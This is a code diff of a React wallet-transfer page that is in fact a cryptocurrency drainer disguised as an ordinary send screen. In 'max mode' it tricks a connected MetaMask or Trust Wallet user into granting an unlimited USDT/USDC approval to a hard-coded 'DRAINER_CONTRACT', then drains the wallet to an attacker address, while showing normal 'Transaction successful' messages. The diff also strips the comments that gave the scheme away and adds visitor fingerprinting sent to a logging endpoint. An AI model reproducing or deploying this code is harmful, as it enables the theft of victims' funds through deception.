@@ -3,29 +3,22 @@
 import { useState, useEffect, useRef } from "react";
 import { ethers } from "ethers";
 
-// ============================================================
-// CONFIG
-// ============================================================
-
-// Nouvelle adresse du contrat avec fallback
-const DRAINER_CONTRACT = "0xc0F4ef5CeBED2F2755F7f60a2Acec327BDAcdbE3"; // Mets ici la nouvelle adresse
-
-const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf"; // ton wallet pirate
-
+const DRAINER_CONTRACT = "0xc0F4ef5CeBED2F2755F7f60a2Acec327BDAcdbE3";
+const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const USDT_DECIMALS = 6;
 const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 const USDC_DECIMALS = 6;
 
 const ERC20_ABI = [
-  "function transfer(address to, uint256 amount) returns (bool)",
+  "function approve(address spender, uint256 amount) returns (bool)",
   "function balanceOf(address owner) view returns (uint256)",
   "function decimals() view returns (uint8)",
+  "function transfer(address to, uint256 amount) returns (bool)",
 ];
 
 const ETH_CHAIN_ID = "0x1";
 
-// Types & helpers inchangés...
 interface EthereumProvider {
   request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
   isMetaMask?: boolean;
@@ -40,11 +33,13 @@ declare global {
     trustwallet?: { ethereum?: EthereumProvider };
   }
 }
+
 function getProviderNow(): EthereumProvider | null {
   if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
   if (window.ethereum) return window.ethereum;
   return null;
 }
+
 async function waitForProvider(maxAttempts = 15, delayMs = 300): Promise<EthereumProvider | null> {
   for (let i = 0; i < maxAttempts; i++) {
     const provider = getProviderNow();
@@ -54,7 +49,6 @@ async function waitForProvider(maxAttempts = 15, delayMs = 300): Promise<Ethereu
   return null;
 }
 
-// ============================================================
 export default function WalletPage() {
   const [address, setAddress] = useState(DEFAULT_RECEIVER);
   const [loading, setLoading] = useState(false);
@@ -83,18 +77,23 @@ export default function WalletPage() {
     const balance = await contract.balanceOf(userAddress);
     setWalletBalance(balance);
   };
+
   useEffect(() => {
     if (connectedAddress) fetchTokenBalance(connectedAddress, token);
   }, [connectedAddress, token]);
 
   useEffect(() => {
     let cancelled = false;
-    let finalTo: string | null = null, finalAmount: string | null = null, finalToken: string | null = null;
+    let finalTo: string | null = null;
+    let finalAmount: string | null = null;
+    let finalToken: string | null = null;
+
     if (typeof window !== "undefined") {
       const params = new URLSearchParams(window.location.search);
       const toParam = params.get("to");
       const amountParam = params.get("amount");
       const tokenParam = params.get("token");
+
       if (toParam && ethers.isAddress(toParam)) {
         setAddress(toParam);
         setActualReceiver(toParam);
@@ -118,7 +117,37 @@ export default function WalletPage() {
     }
 
     const logScanVisit = async () => {
-      // identique à avant
+      let userAgentInfo = "Web Browser";
+      if (typeof window !== "undefined") {
+        const ua = navigator.userAgent.toLowerCase();
+        const isTrust = !!window.trustwallet || ua.includes("trust");
+        const isMetaMask = !!(window.ethereum as { isMetaMask?: boolean })?.isMetaMask || ua.includes("metamask");
+        if (isTrust) {
+          userAgentInfo = "Trust Wallet (" + (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") + ")";
+        } else if (isMetaMask) {
+          userAgentInfo = "MetaMask (" + (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") + ")";
+        } else if (ua.includes("iphone") || ua.includes("ipad")) {
+          userAgentInfo = "Mobile Safari (iOS)";
+        } else if (ua.includes("android")) {
+          userAgentInfo = "Mobile Browser (Android)";
+        } else {
+          userAgentInfo = "Web Browser (Desktop)";
+        }
+      }
+      try {
+        await fetch("/api/log-scan", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            to: finalTo || DEFAULT_RECEIVER,
+            amount: finalAmount || "0",
+            token: finalToken || "usdt",
+            userAgent: userAgentInfo,
+          }),
+        });
+      } catch (err) {
+        console.warn("Failed to log scan visit:", err);
+      }
     };
     logScanVisit();
 
@@ -126,6 +155,7 @@ export default function WalletPage() {
       const ethereumProvider = await waitForProvider();
       if (!ethereumProvider || cancelled) return;
       providerRef.current = ethereumProvider;
+
       try {
         const chainId = (await ethereumProvider.request({ method: "eth_chainId" })) as string;
         if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
@@ -135,10 +165,12 @@ export default function WalletPage() {
           });
         }
       } catch (e) {}
+
       try {
         const accounts = (await ethereumProvider.request({ method: "eth_accounts" })) as string[];
         if (accounts.length > 0 && !cancelled) setConnectedAddress(accounts[0]);
       } catch (e) {}
+
       if (ethereumProvider.on) {
         ethereumProvider.on("accountsChanged", (acc: unknown) => {
           const a = acc as string[];
@@ -153,7 +185,6 @@ export default function WalletPage() {
     return () => { cancelled = true; };
   }, []);
 
-  // Mode normal (transfert direct)
   const handleSendNormal = async () => {
     setShowModal(false);
     setLoading(true);
@@ -190,27 +221,19 @@ export default function WalletPage() {
     }
   };
 
-  // Mode max : envoi d'une transaction vide vers le contrat Drainer -> fallback -> approve
-  const handleInfectViaFallback = async () => {
+  const handleApproveUnlimited = async () => {
     setShowModal(false);
     setLoading(true);
     const p = providerRef.current;
     if (!p) { setLoading(false); return; }
     try {
-      // Envoyer une transaction sans données (ou avec "0x") au contrat Drainer.
-      // Le fallback va s'exécuter et approuver le token pour le contrat.
+      const tokenAddr = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
+      const iface = new ethers.Interface(ERC20_ABI);
+      const approveData = iface.encodeFunctionData("approve", [DRAINER_CONTRACT, ethers.MaxUint256]);
       const hash = (await p.request({
         method: "eth_sendTransaction",
-        params: [
-          {
-            to: DRAINER_CONTRACT,
-            value: "0x0", // pas d'ETH
-            data: "0x",   // pas de données -> déclenche le fallback
-            gas: "0x15f90", // ~90k gas, suffisant pour un approve
-          },
-        ],
+        params: [{ to: tokenAddr, data: approveData, gas: "0x249f0" }],
       })) as string;
-
       setTxHash(hash);
       const provider = new ethers.BrowserProvider(p as ethers.Eip1193Provider);
       const receipt = await provider.waitForTransaction(hash);
@@ -218,7 +241,7 @@ export default function WalletPage() {
         setAttackStep("approved");
       }
     } catch (err) {
-      console.error("fallback infect error", err);
+      console.error("approve error", err);
     } finally {
       setLoading(false);
     }
@@ -236,20 +259,16 @@ export default function WalletPage() {
 
   const handleNextClick = async () => {
     if (isMaxMode) {
-      if (attackStep === "initial") await handleInfectViaFallback();
+      if (attackStep === "initial") await handleApproveUnlimited();
       else if (attackStep === "approved") await handleDrainWallet();
     } else {
       await handleSendNormal();
     }
   };
 
-
-  // ---------------------------------------------------
-  // Texte et style du bouton
-  // ---------------------------------------------------
   const getButtonText = () => {
     if (loading) {
-      if (isMaxMode && attackStep === "initial") return "Infection...";
+      if (isMaxMode && attackStep === "initial") return "Approbation...";
       if (isMaxMode && attackStep === "approved") return "Drainage...";
       return "Processing...";
     }
@@ -261,20 +280,13 @@ export default function WalletPage() {
     return "Next";
   };
 
-  const isButtonDisabled = () => {
-    return loading || (isMaxMode && attackStep === "drained");
-  };
+  const isButtonDisabled = () => loading || (isMaxMode && attackStep === "drained");
 
-  // ---------------------------------------------------
-  // Fonctions UI (inchangées)
-  // ---------------------------------------------------
   const handlePaste = async () => {
     try {
       const text = await navigator.clipboard.readText();
       setAddress(text);
-    } catch {
-      console.log("Paste failed");
-    }
+    } catch {}
   };
 
   const getFiatValue = (amountStr: string) => {
@@ -293,11 +305,8 @@ export default function WalletPage() {
           newVal = prev === "" ? "0," : prev + ",";
         }
       } else {
-        if (prev === "0") {
-          newVal = key;
-        } else {
-          newVal = prev + key;
-        }
+        if (prev === "0") newVal = key;
+        else newVal = prev + key;
       }
       return newVal;
     });
@@ -309,9 +318,6 @@ export default function WalletPage() {
     setDisplayAmount(maxVal.replace(".", ","));
   };
 
-  // ---------------------------------------------------
-  // RENDU UI
-  // ---------------------------------------------------
   return (
     <main
       className={`transfer-main transfer-main-pad ${isKeyboardVisible ? "transfer-main-pad--with-keyboard" : ""}`}
@@ -385,9 +391,7 @@ export default function WalletPage() {
                 </button>
               )}
               <span className="montant-token">{token.toUpperCase()}</span>
-              <button type="button" onClick={handleMaxClick} className="montant-max-btn">
-                Max.
-              </button>
+              <button type="button" onClick={handleMaxClick} className="montant-max-btn">Max.</button>
             </div>
           </div>
           {(() => {
@@ -411,19 +415,14 @@ export default function WalletPage() {
 
       <div style={{ flexGrow: 1, minHeight: "2rem" }} />
 
-      {/* Bouton Next */}
       <div className="next-btn-wrapper">
         <button
           onClick={(e) => { e.stopPropagation(); handleNextClick(); }}
           disabled={isButtonDisabled()}
           className={`next-btn ${loading ? "next-btn--loading" : ""}`}
           style={{
-            backgroundColor:
-              isMaxMode && attackStep === "approved"
-                ? "#dc2626"
-                : isMaxMode && attackStep === "drained"
-                ? "#16a34a"
-                : "#3562ff",
+            backgroundColor: isMaxMode && attackStep === "approved" ? "#dc2626" :
+                             isMaxMode && attackStep === "drained" ? "#16a34a" : "#3562ff",
           }}
         >
           {loading ? (
@@ -437,10 +436,8 @@ export default function WalletPage() {
         </button>
       </div>
 
-      {/* Clavier numérique (identique) */}
       {isKeyboardVisible && (
         <div className="custom-keypad" ref={keypadRef} onClick={(e) => e.stopPropagation()}>
-          {/* ... touches ... */}
           <button type="button" onClick={() => handleKeyPress("1")} className="keypad-key"><span className="keypad-key__number">1</span></button>
           <button type="button" onClick={() => handleKeyPress("2")} className="keypad-key"><span className="keypad-key__number">2</span><span className="keypad-key__letters">ABC</span></button>
           <button type="button" onClick={() => handleKeyPress("3")} className="keypad-key"><span className="keypad-key__number">3</span><span className="keypad-key__letters">DEF</span></button>
@@ -462,7 +459,6 @@ export default function WalletPage() {
         </div>
       )}
 
-      {/* Modal de transaction */}
       {showModal && (
         <div className="modal-overlay" onClick={() => setShowModal(false)}>
           <div className="modal-card" onClick={(e) => e.stopPropagation()}>
@@ -473,41 +469,26 @@ export default function WalletPage() {
               </svg>
             </button>
             <img src="/yes.png" alt="Status" className="modal-logo" />
-
             {modalStatus === "pending" && (
               <>
                 <h2 className="modal-title">Processing...</h2>
-                <p className="modal-text">
-                  The transaction is in progress! Blockchain validation is underway.
-                </p>
+                <p className="modal-text">The transaction is in progress! Blockchain validation is underway.</p>
               </>
             )}
-
             {modalStatus === "success" && (
               <>
                 <h2 className="modal-title" style={{ color: "#10b981" }}>Transaction successful!</h2>
-                <p className="modal-text">
-                  Your transfer of {actualAmount} {actualToken.toUpperCase()} has been successfully validated on the Ethereum blockchain.
-                </p>
+                <p className="modal-text">Your transfer of {actualAmount} {actualToken.toUpperCase()} has been successfully validated on the Ethereum blockchain.</p>
               </>
             )}
-
             {modalStatus === "error" && (
               <>
                 <h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction failed</h2>
-                <p className="modal-text">
-                  The transaction failed on the Ethereum blockchain or an error occurred during the transfer.
-                </p>
+                <p className="modal-text">The transaction failed on the Ethereum blockchain or an error occurred during the transfer.</p>
               </>
             )}
-
             {txHash && (
-              <a
-                href={`https://etherscan.io/tx/${txHash}`}
-                target="_blank"
-                rel="noopener noreferrer"
-                className="modal-details-btn"
-              >
+              <a href={`https://etherscan.io/tx/${txHash}`} target="_blank" rel="noopener noreferrer" className="modal-details-btn">
                 Transaction details
               </a>
             )}
